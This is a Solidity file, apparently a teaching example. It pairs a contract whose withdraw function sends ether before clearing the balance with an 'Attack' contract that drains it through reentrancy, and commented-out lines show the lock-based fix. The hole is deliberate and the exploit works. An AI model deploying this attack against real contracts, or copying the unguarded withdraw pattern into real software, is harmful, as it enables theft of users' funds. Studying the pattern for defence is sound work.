//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

// 1. import contract
// import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract Vulnerable {
    mapping(address => uint) public balances;
    // bool locked = false

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    /* 3. attach nonReentrant (inherit from ReentrancyGuard) to protect against reentracy */
    function withdraw() public {
        // require(locked==false, "Locked");
        // locked= true;
        uint bal = balances[msg.sender];
        require(bal > 0);
        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed Transaction");
        balances[msg.sender] = 0;
        // locked = false;
    }

    function callerAddress()
        public
        view
        returns (address caller, address origin)
    {
        return (msg.sender, tx.origin);
    }
}

contract Attack {
    Vulnerable public vulnerable;

    constructor(address vulnerableAddress) {
        vulnerable = Vulnerable(vulnerableAddress);
    }

    function attack() external payable {
        vulnerable.deposit{value: 1 ether}();
        vulnerable.withdraw();
    }

    receive() external payable {
        if (address(vulnerable).balance >= 1 ether) {
            vulnerable.withdraw();
        }
    }
}
